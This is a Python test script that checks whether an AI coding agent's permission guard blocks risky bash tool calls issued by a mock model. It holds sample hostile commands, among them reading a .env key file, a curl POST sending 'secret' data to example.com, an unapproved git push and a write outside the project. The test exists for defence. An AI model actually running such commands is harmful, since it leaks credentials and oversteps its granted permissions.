#!/usr/bin/env python3
"""Does the Pi coder work end to end, and does the permission guard hold?   (offline: mock upstream)

    python tests/test_pi_coder.py

Real Pi runs against the real gateway; only the model behind the gateway is a mock that answers every
request with ONE bash tool call (a command chosen by this test) and then a final "OK".
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

HELPER = Path(__file__).resolve().parent.parent
ROOT = HELPER.parents[1]
BASH = r"C:\Program Files\Git\bin\bash.exe"
FAILS = []


def check(name, cond, detail=""):
    print(("  ok   " if cond else "  FAIL ") + name + (f"   [{detail}]" if detail and not cond else ""), flush=True)
    if not cond:
        FAILS.append(name)


def run_case(label, command, port_mock, port_proxy, expect_blocked, marker=None):
    sb = Path(tempfile.mkdtemp(prefix="helper_pi_"))
    ign = shutil.ignore_patterns("__pycache__", "state", "node_modules", ".env", "pi_home")
    (sb / "tools").mkdir()
    shutil.copytree(HELPER, sb / "tools" / "openrouter_helper", ignore=ign)
    state = sb / "state"
    state.mkdir()
    (state / "next_task.md").write_text("Task: run the one command you are given.\n", encoding="utf-8")
    env = dict(os.environ, HELPER_ROOT=str(sb), HELPER_STATE=str(state), OR_STATE=str(state),
               OR_UPSTREAM=f"http://127.0.0.1:{port_mock}/v1/chat/completions", OR_PORT=str(port_proxy),
               OR_TIME_SCALE="0.02", OPENROUTER_API_KEY="test-not-real", MOCK_TOOLCMD=command,
               CODER_TIMEOUT="240", PYTHONIOENCODING="utf-8")
    mock = subprocess.Popen([sys.executable, str(HELPER / "tests" / "mock_upstream.py"), str(port_mock)], env=env)
    time.sleep(1.0)
    h = (sb / "tools" / "openrouter_helper" / "helper.sh").as_posix()
    try:
        r = subprocess.run([BASH, h, "coder"], env=env, capture_output=True, text=True, timeout=300)
        out = (state / "pi_last_output.txt").read_text(encoding="utf-8", errors="replace") if (state / "pi_last_output.txt").exists() else ""
        audit = [json.loads(l) for l in (state / "pi_audit.jsonl").read_text().splitlines()] if (state / "pi_audit.jsonl").exists() else []
        print(f"  [{label}] helper exit {r.returncode}; pi output: {out.strip()[:160]!r}; audit: {[(a['tool'], a['blocked']) for a in audit]}")
        check(f"{label}: Pi ran through the gateway and exited", r.returncode == 0 and "Pi coder finished" in r.stdout, r.stdout[-300:] + r.stderr[-300:])
        check(f"{label}: the tool call reached the guard", len(audit) >= 1, str(audit))
        if expect_blocked:
            check(f"{label}: the guard blocked it", any(a["blocked"] for a in audit), str(audit))
        else:
            check(f"{label}: the guard allowed it", audit and not any(a["blocked"] for a in audit), str(audit))
        if marker:
            exists = (sb / marker).exists()
            check(f"{label}: marker file {'absent' if expect_blocked else 'created'}", exists != expect_blocked)
        usage = json.loads((state / "usage.json").read_text()) if (state / "usage.json").exists() else {}
        check(f"{label}: gateway counted the requests", usage.get("total", 0) >= 2, str(usage.get("total")))
    finally:
        subprocess.run([BASH, h, "stop"], env=env, capture_output=True, timeout=20)
        pp = state / "proxy.pid"
        if pp.exists():
            subprocess.run(["taskkill", "/F", "/PID", pp.read_text().strip()], capture_output=True)
        mock.kill()
    return sb


def main() -> int:
    print("A. an ordinary command is allowed and runs inside the project")
    run_case("A", "echo hello > pi_probe.txt", 9953, 9963, False, "pi_probe.txt")
    print("B. git push is refused")
    run_case("B", "git push origin main", 9954, 9964, True)
    print("C. reading the key file is refused")
    run_case("C", "cat tools/openrouter_helper/.env", 9955, 9965, True)
    print("D. writing outside the project is refused")
    outside = Path(tempfile.gettempdir()).parent / "pi_guard_probe_outside.txt"
    outside.unlink(missing_ok=True)
    run_case("D", "echo x > C:/Users/Public/pi_guard_probe.txt", 9956, 9966, True)
    check("D: nothing written outside", not Path("C:/Users/Public/pi_guard_probe.txt").exists())
    print("E. a web request that sends data is refused")
    run_case("E", "curl -X POST -d secret=1 http://example.com", 9957, 9967, True)
    print("\n" + ("ALL PASSED" if not FAILS else f"{len(FAILS)} FAILED: {FAILS}"))
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
